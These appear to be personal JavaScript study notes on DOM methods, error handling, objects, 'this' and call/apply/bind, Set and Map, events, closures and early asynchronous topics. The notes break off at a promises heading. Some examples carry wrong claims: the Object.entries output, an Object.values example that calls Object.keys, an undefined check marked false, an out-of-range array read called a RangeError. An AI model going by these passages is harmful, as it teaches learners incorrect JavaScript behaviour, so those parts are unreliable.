getElementsByTagName(tagName): Selects all elements with the specified tag name.
    Syntax: document.getElementsByTagName('tagName')
    Example: const elements = document.getElementsByTagName('div')
getElementsByName(name): Selects all elements with the specified name attribute.
    Syntax: document.getElementsByName('name')
    Example: const elements = document.getElementsByName('myName')
2.Modifying element properties and attributes :
textContent : Gets or sets the text content of an element, excluding HTML tags.
    Syntax: element.textContent
    Example: const text = element.textContent; element.textContent = 'New text'
innerHTML : Gets or sets the HTML content inside an element, including HTML tags.
    Syntax: element.innerHTML
    Example: const html = element.innerHTML; element.innerHTML = '<p>New HTML content</p>'
setAttribute(name, value) : Sets a specified attribute and its value on an element.
    Syntax: element.setAttribute('name', 'value')
    Example: element.setAttribute('id', 'newId')
removeAttribute(name) : Removes a specified attribute from an element.
    Syntax: element.removeAttribute('name')
    Example: element.removeAttribute('id')
style.property: Sets or gets the inline style properties of an element.
    Syntax: element.style.property = 'value' (to set)
    Example: element.style.backgroundColor = 'blue'
classList.add(): It is used to add one or more CSS classes to an element. It does not directly apply styles; rather, it adds a class to the element, and the associated styles for that class (from CSS) will be applied.It modifies the class list of an element, which affects its styling based on predefined CSS rules associated with that class.
    Syntax: element.classList.add('className');
    Example: element.classList.add('highlight');
3.Creating & appending elements :
createElement(tagName) : Creates a new HTML element specified by the tagName.
    Syntax: document.createElement('tagName')
    Example: let div = document.createElement('div')
appendChild(node) : Appends a child node to the end of the list of children of a specified parent node.
    Syntax: parentElement.appendChild(childNode)
    Example: document.body.appendChild(div)
cloneNode(deep) : Creates a copy of the node, with an optional argument to clone its child nodes as well.
    Syntax: node.cloneNode(true) (deep clone) or node.cloneNode(false) (shallow clone)
    Example: let clonedDiv = div.cloneNode(true)
4.Removing elements: 
remove() : Removes the element from the DOM.
    Syntax: element.remove()
    Example: div.remove()
removeChild(node) : Removes a specified child node from the DOM of the parent node.
    Syntax: parentElement.removeChild(childNode)
    Example: document.body.removeChild(div)
5.Adding & removing event listeners :
addEventListener(type, listener) : Attaches an event listener to an element, specifying the type of event and the callback function to be executed when the event occurs.
    Syntax: element.addEventListener('eventType', callbackFunction)
    Example: button.addEventListener('click', handleClick)
removeEventListener(type, listener) : Removes an event listener from an element, specified by the event type and the callback function.
    Syntax: element.removeEventListener('eventType', callbackFunction)
    Example: button.removeEventListener('click', handleClick) 

getElementById - select a single element 
getElementsByClassName - select multiple elements that shares the same class name
getElementsByTagName - select multiple elements based on their tag name

querySelector - returns the first element
querySelectorAll - returns all the elemets

textContent - The textContent property is used to get or set the text content of an element and its descendants. It operates on the entire text inside an element, ignoring any HTML tags, and treats everything as plain text.
    Syntax:
        element.textContent;  // Read text
        element.textContent = "new text";  // Write text
    Example:
        1.Get Text Content
        const element = document.querySelector('.example');
        console.log(element.textContent); // Outputs: The text inside the .example element
        2.Set Text Content
        const element = document.querySelector('.example');
        element.textContent = 'New text content!'; // Replaces all the existing text in the element with "New text content!"
        3.Remove All Child Elements by Setting Empty Text
        const container = document.querySelector('.container');
        container.textContent = ''; // Removes all text and child elements

innerHTML - The innerHTML property is used to get or set the HTML content of an element. It includes both the element's text content and its child elements.
    Syntax: 
        element.innerHTML;
        element.innerHTML = "new HTML content";
    Example: 
        1.Get Text Content
        const div = document.querySelector('#example');
        console.log(div.innerHTML); 
        // Outputs: "<p>This is a paragraph.</p>"
        2.Set Text Content
        const div = document.querySelector('#example');
        div.innerHTML = '<h1>Updated Title</h1><p>New paragraph content.</p>';
        // Replaces the content of #example with the new HTML
        3.Remove All Child Elements by Setting Empty Text
        const div = document.querySelector('#example');
        div.innerHTML += '<p>Additional paragraph.</p>';
        // Adds a new paragraph while keeping the existing content

createElement() - The createElement() method is used to create a new HTML element. This element is not yet part of the DOM and needs to be explicitly added using methods like appendChild() or append().
    Syntax: document.createElement(tagName[, options]);
    Example: 
        const newDiv = document.createElement('div');
        newDiv.textContent = 'Hello, World!';
        document.body.appendChild(newDiv); // Adds the new element to the DOM
cloneNode() - The cloneNode() method creates a copy of an existing node. The copy can include the node's child elements (deep clone) or exclude them (shallow clone).
    Syntax: node.cloneNode([deep]);
    Example: 
        const original = document.querySelector('.example');
        const clone = original.cloneNode(true); // Deep clone with all child nodes
        document.body.appendChild(clone); // Adds the cloned element to the DOM
createTextNode() - The createTextNode() method is used to create a new text node containing the specified text. A text node represents the textual content in the DOM, and it can be added to an element or used on its own.
    Syntax: document.createTextNode(data);
    Example:
        const newText = document.createTextNode('Hello, World!');
        const newDiv = document.createElement('div'); // Create a container element
        newDiv.appendChild(newText); // Append the text node to the element
        document.body.appendChild(newDiv); // Add the element to the DOM


#### ERROR HANDLING :
Error handling is the process of managing errors.In javascript we use try-catch block to handle errors, try block contains the code that might throw error while catch block is where the error is handled.finally block executes code regardless of whether an error occurred or not.

Throw statement: The throw statement stops the execution of the current function and passes the error to the catch block of calling function.
Error propogation : Error propagation refers to the process of passing or propagating an error from one part of the code to another by using the throw statement with try catch.
How throw statement works :
1.When throw is executed, it stops the current function's execution immediately at the point where it's called.
2.The expression following throw is evaluated, and the result becomes the error object that gets thrown. This can be an Error object or any custom object that represents the error.
3.Once an error is thrown, JavaScript looks for a catch block to handle the error. If it doesn't find one, the error propagates up the call stack (meaning it will search for catch blocks in higher functions or the global scope).
4.If no catch block is found to handle the error, the script stops running and the error is logged.
5.The throw statement halts the current function, so any code following throw will not execute unless the error is caught and handled.
6.Typically, throw is used in conjunction with a try-catch block to handle exceptions gracefully. The catch block can process the error, allowing the program to continue running.

// With throw statement : code continues execution & last console log statement executed
    function UserData() {
        try{
        validateUserAge(25);
        validateUserAge('invalid');
        validateUserAge(15);
        } catch(error){
        console.error('Error', error.message)
        }
    }
    function validateUserAge(age){
        if(typeof age !== 'number'){
            throw new Error('Age must be a number')
        }
        console.log('User age is valid')
    }
    UserData();
    console.log('Code execution Continued ....');
// Without throw statement: code stops execution & does not execute last console log statement
    function validateUserAge(age) {
        if (typeof age !== 'number') {
        throw new Error('Age must be a number'); // Error is thrown here
        }
        console.log('User age is valid');
    }  
    validateUserAge(25);
    validateUserAge('invalid'); // This will throw an error and stop further execution
    validateUserAge(15); // This will NOT execute
    console.log('Code execution Continued ....');

Best practises error handling :
1.Use try-catch block
2.Use throw statement with descriptive error message
3.log the error or re-throw the error if you can't handle it in the current context.

Error types in javascript :
1.Syntax error : Incorrect syntax, such as missing paranthesis or comma or quotes results in syntax error
2.Reference error : Accessing a variable that hasn't been declared or is out of scope.
3.Type error : Performing an operation on a value of an unexpected type.
    const number = 42;
    console.log(number.toUpperCase());
4.Range error : A value is outside the acceptable range, such as an invalid array length.
    const arr = [1,2,3,4]
    console.log(arr[10]);

#### OBJECTS :
An object is a data type that allows you to store key-value pairs. It basically allows you to create a container where you can put variables & functions. In javascript object keys are always strings & values can be any data type including primitive as well as referenced data type.We can define function inside the object which is called as method.
Instead of passing multiple parameters to the functions we can create object out of those parameters & pass it to the function.

To add read-only & non-deletable properties to object :
const proto = Object.defineProperty({}, 'pCode', {
  writable: true,
  configurable: true,
  value: 2001
});
const obj = Object.create(proto);
obj.pCode = 1001
console.log(obj.pCode); // 1001
If we change writable to false the we get obj.pCode as 2001 
writable: If we set it to true then the value of the property can be changed but if we set it to false, value of property 
cannot be changed, and attempts to modify it will have no effect means it make propety readable only.
configurable: If set to true, the property can be deleted or its descriptor (such as writable, enumerable, or configurable) can be modified. If set to false, the property cannot be deleted or its descriptor altered.

ES6 property value short hand :
let pCode = 1001;
let obj = {
    // pCode: pCode,   -- here first one is property name & second one is variable name from which value will be fetched
    pCode  // ES6 shorthand
}

Assigning the object : Assignment is done by the reference, when we assign both the objects points to same location in the memory. So changing property of one object will reflect in another object also.
let obj = { a: 'First' };
let obj1 = obj;
obj1.a = 'Second';
console.log(obj.a)  // Second
console.log(obj1.a) // Second
When you assign an object to another variable, the reference to the original object is passed, not a copy or clone of the object. As a result, if you modify the properties of one object, those changes are reflected in the other object as well because both variables point to the same object in memory.

To clone or copy object : 
1.Spread operator :
    const clonedPerson = { ...person };
2.Object.assign :
    const clonedPerson = Object.assign({}, person);
3.JSON.parse() & JSON.stringify() :
    const clonedPerson = JSON.parse(JSON.stringify(person));
4.Using structuredClone() : for Modern Browsers & Node.js 17+. It does not handle functions
    const clonedPerson = structuredClone(person)
5.Using lodash library : 
    const _ = require('lodash')
    const deepCopy = _.cloneDeep(original);
lodash libraries cloneDeep is best for deep copy of objects because it handles nested objects as well as special objects like Date, RegExp, Map, Set, Function, and objects with circular references.

'this' object : this object contains the current context. It can have different values depending upon where it is placed.
    console.log(this); // window or global object
Since current context is windows or global the value of this object is windows or global
    function test(){
        console.log(this); // windows or global
    }
    test();
Since test function is placed in window or global object, this keyword points to window or global object
const obj = {
  test: function(){
    console.log(this) // {test: test()}
  }
}
obj.test()
Since we placed the test function inside the obj object, the this keyword points to the obj object.
const obj = {
  test: () => {
    console.log(this) // windows or global
  }
}
obj.test();
Since arrow functions do not have their own this keyword, they inherit this from the surrounding lexical scope. In this case, since the object obj is defined in the global scope (which is the window object in browsers), this inside the arrow function will refer to the window object.
Inside arrow function this object does not refer to current context instead it refers to global context.

Earlier in ES5 function had a duty to behave as a class, arrow function doesn't have to behave as a class. It is free from playing a role of class so it doesn't have to worry about handling the this with the current context.

If this is used outside any function, wrapper, object literal, or class, it defaults to the window object. However, in strict mode, this in the global scope will be undefined.

IMP :
Scope: Refers to the variables accessible in a part of your code.
Context: Refers to the object to which the current code belongs (determined by this).
1.In the global scope, the context is the global object (window in browsers or global in Node.js).
2.For regular functions, context depends on how the function is called.
3.When a method is called on an object, the context is the object calling that method .
4.In a class, this refers to the instance of the class.
5.Arrow functions do not have their own this; they inherit it from their lexical scope.
6.Event Listener Context :
    For regular functions, this refers to the element that triggered the event.
    For arrow functions, it inherits this from the surrounding lexical scope.
7.Explicitly Set Context :
    call, apply, bind methods allow explicit setting of the this value

To set this keyword explicitly point to object :
Call, Apply & Bind methods : As we know this keyword refers to current context & in regular function this keyword points to global object.To change the context(this) of the function we use these method.
The primary purpose of call, apply, and bind is to change the reference of this inside a function and make it point to the object passed as an argument to these methods.call & apply differ in terms of arguments like call accepts arguments separated by commas, while apply accepts arguments as an array. Call & bind differs in terms of execution, call executes the function immediately, whereas bind does not execute the function immediately but instead returns a new function, which can be called later to get the result.
    function test(a, b){
        console.log(this)
        console.log(a, b)
        }
    let obj = {
        a: 5
        }
    test(obj); // value of this is window object
    test.call(obj, 5, 6); //  this points to the object obj now { a: 5 }
    test.call(5, 6);  // Number {5} as base class of 5 is number, a is 6 & b is undefined
The first parameter of the call method is an object, which is automatically assigned to the this keyword within the function. Therefore, there is no need to explicitly pass the object as a parameter to the function.
We want to make this keyword inside the function point to or refer to obj object.Currently above this keyword pointing to window object global.
So we use call method which has object as default first argument & we dont need to pass it in parameter also. The first argument, thisArg, is always passed as the value of this inside the function.
So in short call method is used to change the reference or the context or the value of this object.
Apply is same as Call the difference is it takes two arguments only first is object & second is array of arguments.
    test.apply(obj, [5,6]); // {a: 5} 5 6  - since this points to the object
Bind is same Call the difference is bind change the reference of 'this' but it does not execute the function immediately like Call instead it returns another function. It basically acts like a function expression.
    const fe = test.bind(obj, 5, 6);
    fe(); // {a: 5} 5, 6

JSON (JavaScript Object Notation) is a lightweight data interchange format between a server and client. JSON consists of key-value pairs.JSON requires double quotes for keys and string values. 
JSON Vs Objects :
JSON is a data format that represents structured data as text, while JavaScript object is a data structure that is used to store data in key-value pair.
JSON requires double quotes for keys and string values, while JavaScript object keys are always converted to strings, regardless of whether you use single quotes, double quotes, or no quotes at all.(we can use number or boolean values as a key in a object but javascript will convert it to string).
JSON to Object: Use JSON.parse() to convert JSON (string) into a JavaScript object. 
    Example : const obj = JSON.parse(jsonString);
Object to JSON: Use JSON.stringify() to convert a JavaScript object into a JSON (string).
    Example : const jsonString = JSON.stringify(objectName);

Ways to create object :
1.Using Object Literal: The simplest and most common way to create an object.
2.Using the new Object() Syntax: 
    const person = new Object();
    person.name = 'John';
    person.age = 30;
    person.greet = function() {
    console.log('Hello, ' + this.name);
    };
3.Using a Constructor Function: A function can act as a blueprint (constructor) for creating objects.
    function Person(name, age) {
    this.name = name;
    this.age = age;
    this.greet = function() {
        console.log('Hello, ' + this.name);
    };
    }
    const person1 = new Person('John', 30);
    const person2 = new Person('Jane', 25);
3.Using Object.create() method : When you have an existing object and you want to create a new object that inherits from that existing object, you can use Object.create().
    const prototypeObj = {
    greet: function() {
        console.log('Hello, ' + this.name);
    }
    };
    const person = Object.create(prototypeObj);
    person.name = 'John';
    person.age = 30;
4.Using a Class (ES6 and Beyond): 
    class Person {
    constructor(name, age) {
        this.name = name;
        this.age = age;
    }
    greet() {
        console.log('Hello, ' + this.name);
    }
    }
    const person1 = new Person('John', 30);
    const person2 = new Person('Jane', 25);
5.Using Object.assign() Method: Object.assign() is used to copy values from one or more source objects into a target object, effectively creating a new object.
    const person = Object.assign({}, { name: 'John', age: 30 });
6.Using JSON.parse() and JSON.stringify() (for deep cloning): You can create an object by parsing a JSON string using JSON.parse().
    const jsonString = '{"name": "John", "age": 30}';
    const person = JSON.parse(jsonString);

Arrays Vs Objects:
Arrays are Ordered collection of elements, indexed by numerical keys, while objects are unordered collection of key-value pairs, where the keys/properties are typically strings or symbols, and the values can be any data type.
We can access array elements using indices while in objects we use keys to access the values using dot or bracket notation.
Arrays are best for ordered collection of data while objects are best for unordered or unstructured data.
We use for..of or forEach methods to iterate over arrays while to iterate over objects we use for...in or by using Object.keys(), Object.values(), or Object.entries().
Objects are more memory efficient as compare to arrays due to their ability to dynamically resize and manage indices.

add or modify or delete properties of an object :
add property :
    const person = {}
    person.name = 'vai'
modify property :
    person.name = 'vaibhav'
delete property :
    delete person.name

dot notation and bracket notation : Both dot notation and bracket notation are used to access properties or methods of an object.Dot notation is more popular and used due to its simplicity.
Limitation of dot notation - In some scenarios bracket notation is the only option, such as when accessing properties when the property name is stored in a variable.

Object.keys(), Object.values() & Object.entries() :
    const person = { name: 'John', age: 30 };
    const keys = Object.keys(person);
    const values = Object.values(person);
    const both = Object.entries(person);
    console.log(keys) // ["name", "age"]
    console.log(values) // ["John", 30]
    console.log(both) // [["name", "age"], ["John", 30]]

4 ways to iterate over objects :
    const person = {
        name: 'John',
        age: 30
    }
1.for..in loop : 
    The for...in loop iterates over the keys of an object.
    To get the values, you access the object using object[key] inside the loop.
    for(let prop in person){
        console.log(prop + ": " + person[prop])
    } // output: name: John age: 30
2.Object.keys() & forEach() : Use Object.keys() when you want to access the keys and then access the corresponding values using person[key].
    Object.keys(person).forEach(key => {
        console.log(key + ": " + person[key]);  // key is the property name, person[key] is the value
    }); // output: name: John age: 30
3.Object.values() & forEach() : If you just need the values, you can use Object.values(person)
    Object.keys(person).forEach(value => {
        console.log(value);
    }); // output: John 30

To check if property exists in object :
1.Using in operator :
    console.log('name' in person) // true
2.Using hasOwnProperty() method :
    console.log(person.hasOwnProperty('name'))  // true
3.Comparing with undefined :
    console.log(person.name !== undefined) // false

deep copy and shallow copy :
shallow copy : Shallow copy supports only one level of copy i.e first level properties, for nested objects or arrays it only copy their references.So any changes made in nested object will reflect in both objects original as well as copied object & vice versa. For example Object.assign(), Object.create() & spread operator creates shallow copy of objects
deep copy : It supports all levels of copy including nested objects and arrays.Changes made to the deep-copied object do not affect the original object (and vice versa).It is more expensive in terms of memory and performance. For example JSON.parse() & JSON.stringify(), structuredClone() and Lodash _.cloneDeep().



SET : Set is an unordered collection of unique values, and it does not support indexing & does not allow duplicate values. It provides methods for adding, deleting, and checking the existence of values in the set like add method, delete method, has method. Set can be used to remove duplicate values from arrays.To access the values of set we can use forEach() method or for..of loop or values() method.
To use for..of loop on set we first apply values() method to the set which returns an iterator object that lets you iterate through the values of the Set. Then we apply for..of loop on it.

MAP : A Map in JavaScript is a collection of key-value pairs where both the keys and the values can be of any data type.Each key-value pair in a Map is stored internally as an array. Unlike objects, where keys are typically strings (or Symbols), Maps allow keys of any type (e.g., objects, functions, primitive types).A Map maintains the order of key-value
pairs as they were inserted but it does not have indices.
To create a Map, you need to use the Map constructor or methods like set() :
    const map = new Map([
        ['name', 'John'],
        ['age', 30],
        [1, 'One'],
        [true, 'Boolean']
    ]);
To access map elements : We can use forEach(), for..of on map & for..of with entries
    1.console.log(map.get('name'));
    2.map.forEach((value, key) => {
        console.log(`${key}: ${value}`);
    });
    3.for (const [key, value] of map) {
        console.log(`${key}: ${value}`);
    }
    4.for (const entry of map.entries()) {
        console.log(entry);  // Prints each key-value pair as an array
    }
We can convert map to array using Array.from(map).

Maps Vs Objects :
Objects : 
    Keys must be strings or symbols. 
    Order of keys is not guaranteed for non-integer keys. 
    Faster for small datasets with string keys. 
    No built-in methods for key-value manipulation. 
    Requires for...in or Object.keys() to iterate. 
    Inherit from Object.prototype, potentially causing key collisions. 
    No built-in size property, must use Object.keys().
Maps : 
    Keys can be any data type, including objects, functions, and primitives. 
    Keys are stored in insertion order. Better for frequent updates and large datasets. 
    Provide methods like .set(), .get(), .has(), and .delete(). 
    Directly iterable with for...of or .forEach(). 
    Do not inherit from Object.prototype, avoiding key collisions. 
    Have a .size property for quick size checks.

#### EVENTS : 
Events are actions that happen in the browser, such as a button click, mouse movement, or keyboard input.For example we want click to be triggered when user click on a button. Then first we get the reference of the button element & then we add click event using addEventListener function. Also we need to add event handler in addEventListener function.
There are many types of events that you can add to HTML elements to trigger specific actions like click, mouseover, keydown, keyup, submit, focus, blur, change, load, resize.

How events works :
1.Event Source: An event is triggered by an element in the Document Object Model (DOM). This could be a button, input field, or any other element.
2.Event Listener: You add an event listener to an element. The listener is a function that waits for an event to occur, and when the event happens, the function gets called. You attach an event listener using addEventListener.
    const button = document.querySelector('button');
    button.addEventListener('click', function() {
        alert('Button clicked!');
    });
3.Event Handler: The function you provide to addEventListener is the event handler (or callback function). It defines what should happen when the event occurs.
4.Event Object: When the event occurs, JavaScript passes an event object to the handler function. This object contains detailed information about the event, such as the target element (event.target), the type of event (event.type), and the position of the mouse, for example, in the case of mouse events.
    button.addEventListener('click', function(event) {
        console.log('Event type: ', event.type);
        console.log('Event target: ', event.target);
    });
5.Event Propagation: Events in JavaScript follow a certain propagation flow: capturing, target, and bubbling.
    1.Capturing Phase: The event starts from the root of the DOM and propagates down to the target element.
    2.Target Phase: The event reaches the target element where it is fired.
    3.Bubbling Phase: The event bubbles back up from the target element to the root.
You can control this flow using event.stopPropagation() to prevent further propagation.
6.Event Delegation: Instead of attaching event listeners to every individual element, you can delegate the event handling to a parent element. This is useful for dynamic content (e.g., dynamically created buttons) and improves performance.
    document.querySelector('#parent').addEventListener('click', function(event) {
        if (event.target.matches('button')) {
            alert('Button clicked!');
        }
    });
7.Event Removal: You can remove an event listener if you no longer need it using removeEventListener.
    const button = document.querySelector('button');
    const handler = function() { alert('Button clicked!'); };
    button.addEventListener('click', handler);
    // Later, to remove the event listener:
    button.removeEventListener('click', handler);

Summary : In summary, events work by attaching listeners to DOM elements. When the event is triggered (e.g., user clicks a button), the listener function is executed, and you can use the event object to access additional information.
Event Target: The DOM element that the event is bound to.
Event Type: The type of event, such as 'click', 'keydown', 'submit', etc.
Event Listener: The function that is called when the event occurs.
Event Object: The object that contains details about the event.

Event bubbling: Event bubbling is the process in JavaScript where an event triggered on a child element propagates up the DOM tree, triggering event handlers on its parent elements.
// Check event_bubbling.html
    <div id="outer">
        <div id="inner">
            <button id="myButton">Click Me</button>
        </div>
    </div>
    // Get references to the elements
    const outer = document.getElementById("outer");
    const inner = document.getElementById("inner");
    const button = document.getElementById("myButton");
    // Attach event handlers
    outer.addEventListener("click", handleBubbling);
    inner.addEventListener("click", handleBubbling);
    button.addEventListener("click", handleBubbling);
    // Event handler function
    function handleBubbling(event) {
        console.log("Bubbling: " + this.id);
        // event.stopPropagation();
    }
When the button is clicked, it is the child element triggering the event, and the event bubbles up to its parent (inner) and then further up to its grandparent (outer).

stopPropagation() : Event bubbling can be stopped by calling stopPropagation() method on event.
To prevent event bubbling and stop the event from propagating to parent elements, the stopPropagation() method can be used within the event handler function. Adding stopPropagation() to the handleBubbling function ensures that clicking the button only triggers its own event handler and not those of its parent or grandparent elements.

Event capturing: Event capturing, also known as event trickling, is a process in JavaScript where an event is handled starting from the topmost ancestor in the DOM tree (like document or window) and then propagates down to the specific target element.
In bubbling, the event starts at the target element and propagates upward to its ancestors. Capturing is the reverse: the event flows downward before reaching the target. Event capturing is less commonly used than bubbling.
// Check event-capturing.html
To convert the example to use event capturing, you need to set the third parameter of the addEventListener method to true. This ensures the event handlers are executed during the capturing phase as the event propagates from the topmost ancestor down to the target element.We can use stopPropagation() method to stop propogation of event, it does not executes inner & myButton.

preventDefault() : The event.preventDefault() method is used to stop the browser's default behavior associated with an event. For example, if a link is clicked, the default action of navigating to the URL will be prevented.
When we add event.preventDefault() in addEventListener function it will stop navigation when we click on link.

this keyword : this keyword in JavaScript refers to the element that the event handler is attached to when used within an event listener.
<body>
    <button id="myButton">Click Me</button>
    <script>
        // Get reference to the button element
        const button = document.getElementById("myButton");
        // Add an event listener to the button
        button.addEventListener("click", handleClick)
        function handleClick() {
            // 'this' refers to the button element here
            console.log("Button clicked: " + this.id);
        };
    </script>
</body>
Here the event listener is attached to the button element.Inside the event handler function, the this keyword refers to the element that the event listener is attached to (the button in this case).When the button is clicked, the console will display the message: Button clicked: myButton.

removeEventListener() method is used to remove event handler from element.
    button.removeEventListener('click', handleClick);
When we add removeEventListener at the last line (above </script> tag), even we click on button we will not see any log in console saying 'Button clicked'.
// check removeEventListener.html

#### CLOSURES :
Defn: A closure allows the inner function to access and modify variables from the outer function's scope even after the outer function has completed execution. It provides a way to maintain state without relying on global variables, encapsulates data for better privacy, and supports code reusability, making closures a powerful concept in JavaScript programming.
In javascript we have 3 types of scopes : Global, Function & Block.
The concept of lexical scoping ensures that variables declared in an outer scope are accessible in nested or inner functions.
    function outer() {
        const outerVar = 'outer scope'
        function inner() {
            console.log(outerVar);
        }
        inner()
    }
    outer() // outer scope
The ability of the inner function to access the variable (outerVar) of the outer function is called as lexical scoping.
Lexical scoping is the base of the closure.
Difference between lexical scoping & closure :
Closure uses the lexical scoping concept. In lexcial scoping you don't need to return the inner function & then assigning it to the the variable.
Closure is like one step ahead of lexical scoping where we return the reference of the inner function & that reference we store in a variable & call it wherever we need it. This way it preserve the access to the outer function's variables even after the outer function has executed.
A closure in JavaScript is a combination of a function and the lexical environment. Closure has qualities of both functions & lexical scoping. Closures are used to modify data or variables safely.
Example :
    const addCounter=()=>{
        let counter=0;
        counter++;
        return counter;
    }
    console.log(addCounter()); // 1
    console.log(addCounter()); // 1
    console.log(addCounter()); // 1
In the given code, every time the addCounter function is called, the counter variable is reinitialized to 0 & then 
incremented by 1 and then returned. As a result, the function does not remember the previous value of counter variable 
between the multiple calls. Each call to addCounter creates a new execution context with a fresh counter variable. 
Therefore, the function always returns 1 regardless of how many times it is called.
To make the counter variable remember its value across all the function calls either we make it global or we create closure by returning new function from addCounter function.
let counter=0;
const addCounter=()=>{
    counter++;
    return counter;
}
console.log(addCounter()); // 1
console.log(addCounter()); // 2
console.log(addCounter()); // 3
Making counter variable global will create side effects & may lead to variable conflict in global scope. So we prefer creating closure.
const addCounter=()=>{
    let counter=0;
    return function () {
        counter++;
        return counter;
    }
}
const closure1 = addCounter();
console.log(closure1()); // 1
console.log(closure1()); // 2
console.log(closure1()); // 3
console.log(closure1()); // 4
When we return a function from the addCounter function and store the returned function in a variable, the returned function forms a closure. This closure allows the inner function to retain access to the counter variable of the outer function's scope, even after the outer function has finished executing.
As a result, the counter variable persists its value across multiple function calls to the inner function, and modify its 
value without being reinitialized.
const closure2 = addCounter();
console.log(closure2()); // 1
console.log(closure2()); // 2
console.log(closure2()); // 3
Each time we call addCounter function it creates a new closure with its own seperate counter variable.
In example last value of counter variable was 4 but when we have created closure2 it will start counter variable from 0 again & creates new closure.

Benefits of Closures:
1.Closure can be used for data modification with data privacy(encapsulation)
2.Persistent Data and State - Each time addCounter() is called, it creates a new closure with its own separate count variable.
3.Code Reusability - The closure returned by addCounter() is a reusable counter function. 

Encapsulation in the context of closures : Abstraction Inheritance Encapsulation Polymorphism
It is one of the principals of the OOP. It is used to make the data more secure. In above example counter variable is data which is encapsulated or wrapped within addCounter function, we can not modify value of counter variable value anywhere outside the addCounter function. To modify its value first we create the closure & then call it.
In the context of closures, encapsulation refers to the practice of keeping certain data or variables private and only exposing them through controlled access, usually via functions or methods. This is a fundamental concept of Object-Oriented Programming (OOP).

Disadvantages of closure :
Closure persists & maintain the state of data whenever we call same closure again & again. Now if we no longer require closure1 so it must be released. Because data values inside the closure will consume memory. So main limitation of closure is memory leaks which can impact the performance.
Memory Leaks - If closures are not properly managed, they can hold onto unnecessary memory because Closures retain references to the variables they access.

How to release the variable references or closures from memory ?
You can release the reference to the closure by setting closure to null. For example in above example when we set closure1 to null it will release the reference of the counter variable.
closure1 = null;

Difference closure & regular function :
Regular functions do not retain access to their reference variables after execution completes.Closures retain access to their reference variables event after execution completes.
Regular functions do not maintain the state of a variable or preserve data across multiple calls. Each time a regular function is called, its variables are reinitialized, and the state is not retained between function executions.
Closures, on the other hand, maintain the state of variables and preserve data across multiple calls. The inner function retains access to the outer function's variables, allowing the state to persist even after the outer function has finished executing.



A dynamic key is simply a variable defined outside the object, and it's accessed using bracket notation to assign that variable as a key within the object.
    Example: let variable = property/key 
             const object = {
                [ variable ]: value
             }
    Trick : variable = property/key = [ variable ]: value
for...in mostly used for iterating over the properties of the objects 
for...of mostly used for iterating over the values of the iterables like arrays, strings, maps, sets

#### ASYNCHRNOUS PROGRAMMING :
In synchronous programming, tasks are executed in sequence. Task 2 will only begin once Task 1 is completed, meaning Task 2 must wait for Task 1 to finish. This results in Task 1 blocking the execution of Task 2, which may impact performance.
In Asynchronous programming tasks are executed concurrently or parallely meaning they do not have to wait for each other to complete.Task 2 will not wait for Task 1 to finish; it can start execution immediately. This allows multiple tasks to be processed in parallel, enhances the performance without blocking other tasks.

Asynchronous programming allows multiple tasks or operations to be initiated and executed concurrently. Asynchronous operations do not block the execution of the code.
Asynchronous programming can be used for tasks such as fetching data from an API, downloading and uploading large files, or handling any time-consuming operations.

JavaScript is single threaded not multi-threaded like C sharp or Java. So javascript can execute single task at a time but by using Asynchronous programming javascript can handle multiple tasks concurrently or in parallel.

Differences Asynchronous & Synchronous :
In synchronous programming tasks are executed one after another in a sequential manner means each task must complete before the program moves to the next task whereas in Asynchronous programming tasks can start, run & complete in parallel or concurrently means tasks can be executed independent of each other.
Execution of the code is blocked until the task is finished whereas Asynchronous operations are typically non-blocking.
synchronous operation can lead to blocking & unresponsiveness in browsers while Asynchronous operations provide better concurrency and responsiveness in browsers due to its non-blockig nature.
synchronous is the default mode of execution, so we do not need to write extra code for it while Asynchronous programming can be achieved throght techniques like callbacks, promises & async-await.

Techniques to achieve Asynchronous operations :
1.setTimeout method :
2.setInterval method :
3.Callbacks :
4.Promises :
5.Async/await :
6.Generators with yield :
7.Event-driven programming :

setTimeout() : setTimeout() is a built-in JavaScript function that allows you to schedule the execution of a function after a specified delay asynchronously.
    Syntax : setTimeout(function, delay, arg1, arg2, ...)
    Example :
            console.log('Start');
            setTimeout(function () {
                console.log('TimeOut');
            }, 4000);
            console.log('not blocked');
The setTimeout function executes after 4 seconds but it does not block the execution of the code as it is asynchronous function.In above example setTimeout() function will be executed last after execution of both the console log statements.

setInterval() : setInterval() is a built-in JavaScript function that allows you to repeatedly execute a function at a specified interval asynchronously.
    Syntax : setInterval(function, interval)
    Example :
            console.log('Start');
            const intervalId = setInterval(function () {
                console.log('I am non-blocking...');
            }, 2000);
            console.log('not blocked');
            setTimeout(() => {
                clearInterval(intervalId);
                console.log('Interval cleared ...')
            }, 6000)

clearInterval() : The clearInterval() function in JavaScript is used to stop a timer that was previously set by setInterval(). First save setInterval() in variable then inside setTimeout() call clearInterval(). Remember always set the setInterval() timeout to a value smaller than the timeout for clearInterval()

Callbacks : Callbacks in JavaScript are functions that are passed as arguments to other functions. Callbacks mostly used with asynchronous methods like setTimeout().
    function fetchData(callback) {
        setTimeout(function () {
            const apiResponse = { data: 'fetched data'};
            callback(null, apiResponse)
        }, 2000)
    }
    function processApiResponse(error, response) {
        if(error){
            console.error('Error', error);
        } else {
            console.log('Data:', response.data);
        }
    }
    fetchData(processApiResponse)
Here in example processApiResponse is callback function which is passed as an argument to the fetchData function. 
the parameters in processApiResponse (error and response) are dynamically filled with the values passed from the fetchData function when the callback is invoked.The response parameter in the processApiResponse function is replaced by the apiResponse object. Therefore, to access the data property of the apiResponse object, we use response.data.

Callback hell : Callback hell, also known as the "pyramid of doom," refers to the situation when multiple nested callbacks are used, leading to code that becomes difficult to read, understand, and maintain.
// Check example in index.js

#### PROMISES
Promises in JavaScript are a way to handle asynchronous operations. A Promise can be in one of three states: pending, resolved, or rejected. A promise represents a value that may not be available yet but will be available at some point in the future.
Promises are objects that represent the result or failure of an asynchronous operation.They allow you to handle asynchronous code in a more manageable way than using traditional callbacks.
Promises are an effective solution to callback hell in JavaScript, which is a situation where multiple nested callbacks create complex and hard-to-read code.
Promise has 3 main states :
    Pending: The initial state; the Promise is neither fulfilled nor rejected.
    Fulfilled: The operation completed successfully, and the Promise has a result (value).
    Rejected: The operation failed, and the Promise has a reason (error).
How to create promise :
A Promise is created using the Promise constructor, which takes two parameters: resolve and reject. These are built-in callback functions. Inside the promise constructor, we perform an asynchronous operation. If the operation succeeds, the resolve() function is called, and if it fails, the reject() function is called. The result from the resolve() function is handled by the then() method & the error from the reject() function is handled by the catch() method.
So to handle the promise results we use then() & catch() methods.
A promise represents a single asynchronous operation, and it cannot be reused once it is resolved or rejected.
// Check promise.js
When to use promise :
